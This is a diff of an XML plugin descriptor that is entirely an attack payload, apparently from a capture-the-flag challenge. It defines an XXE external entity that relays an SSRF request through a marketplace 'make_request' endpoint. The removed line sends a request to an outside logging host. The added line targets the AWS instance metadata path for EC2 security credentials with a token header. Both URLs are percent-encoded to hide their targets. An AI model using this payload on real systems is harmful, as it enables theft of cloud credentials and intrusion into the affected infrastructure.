@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
         <!ELEMENT foo ANY >
-        <!ENTITY xxe SYSTEM "http://marketplace:8080/make_request?url=%68%74%74%70%73%3a%2f%2f%63%74%66%2d%33%2e%65%72%74%65%6c%2e%6f%6e%65%2f%6c%6f%67%2f%6a%6f%70%61&httpMethod=GET&headers=a:b">
+        <!ENTITY xxe SYSTEM  "http://marketplace:8080/make_request?url=%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2f%6c%61%74%65%73%74%2f%6d%65%74%61%2d%64%61%74%61/identity-credentials/ec2/security-credentials/ec2-instance&httpMethod=GET&headers=X-aws-ec2-metadata-token:AQAAAOLe91qyhE-rKDWuenDzb8tFw2iGAvwvNnu1-Ey6ODajp6HYOQ==" >
         ]>
 <ide-plugin xmlns="">
     <name>&xxe;</name>
